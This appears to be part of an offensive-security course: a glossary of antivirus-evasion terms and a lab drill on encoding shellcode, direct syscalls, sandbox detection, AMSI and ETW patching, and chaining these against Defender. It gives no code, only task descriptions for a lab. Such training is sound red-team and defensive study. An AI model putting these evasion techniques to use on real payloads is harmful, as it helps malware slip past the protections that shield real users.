| **Behavioural analysis** | Dynamic monitoring of running process actions via API hooks and ETW |
| **Sandbox** | Isolated execution environment that runs the payload and observes all behavior |
| **Polymorphism** | Same functional payload with different bytes on each generation via encoding and decoding stubs |
| **Metamorphism** | Code transformation that preserves logic while changing instruction sequences — no decoding loop needed |
| **Packer** | Software that compresses/encrypts a PE and wraps it in a stub that decodes and executes at runtime |
| **AMSI** | Antimalware Scan Interface — Windows API allowing AV to scan dynamic content (PowerShell, .NET, VBA, etc.) |
| **ETW** | Event Tracing for Windows — high-speed kernel telemetry framework; source of EDR visibility |
| **PE header stomping** | Zeroing the PE headers in memory after load to defeat in-memory PE-signature scanning |
| **Stack strings** | Building string values character by character on the stack at runtime to avoid plaintext strings in binary |
| **API hashing** | Resolving exports by comparing hash values instead of string names to avoid plaintext API names |
| **CPUID hypervisor bit** | CPU feature flag (CPUID leaf 1, ECX bit 31) set by virtualisation platforms; sandbox detection indicator |
| **Sleep acceleration** | Sandbox technique that makes Sleep() calls return instantly; detected by comparing elapsed vs expected time |
| **BYOVD** | Bring Your Own Vulnerable Driver — using a legitimately-signed vulnerable driver to gain kernel access |
| **Entropy** | Shannon entropy measure of randomness; packed/encrypted data has entropy ~8.0 (flagged by AV) |
| **Dynamic API resolution** | Resolving function addresses at runtime via GetProcAddress/export walk instead of static imports |
| **SysWhispers** | Tool to generate syscall stubs for all Windows NT functions, bypassing userland Win32 API hooks |

---

## Drill 12 — AV Evasion

Go to `DRILLS/12_av_evasion/`. A test environment with Windows Defender
enabled and a Cuckoo sandbox is provided.

Your missions:

1. **Signature evasion**: Take the provided detected shellcode. Implement
   a custom XOR encoder. Verify Defender no longer detects the file.
   Document which specific byte pattern was being detected (use
   MpCmdRun.exe verbose scan output or CyberChef to isolate the trigger).

2. **Heuristic evasion**: Take the provided test injector (detected by
   heuristics). Replace all Win32 injection calls with SysWhispers
   syscall equivalents. Verify Defender heuristic scan passes.

3. **Sandbox evasion**: Implement the full sandbox detection suite:
   sleep acceleration, CPUID check, process count, screen resolution.
   Submit to the lab Cuckoo instance. Verify Cuckoo reports no malicious
   behavior (your payload should not execute inside Cuckoo).

4. **AMSI bypass**: In a fresh PowerShell session, confirm Defender's AMSI
   blocks `Invoke-Mimikatz`. Implement an AMSI bypass (patch AmsiScanBuffer).
   After bypass, confirm the string passes. Document the bypass technique
   and what signature-level change would be needed to re-detect it.

5. **ETW patch**: Patch EtwEventWrite in your test process. Use a Process
   Monitor / ETW consumer to verify that allocation events from your
   process are no longer appearing in the ETW stream.

6. **Full chain**: Combine all mitigations into a single test payload.
   Drop it in the lab, let it run, document which Defender/EDR detections
   fire (if any) and which are successfully bypassed. Be specific —
   which layer stopped it, or which layer it passed.

Step 6 is the only step that tells you whether the components work TOGETHER.
Individual bypasses that each work in isolation can still trip over each
other when combined. Integration testing is mandatory.

---

— ENTROPY stripped to look like noise,
the scanner READS what you chose to show it

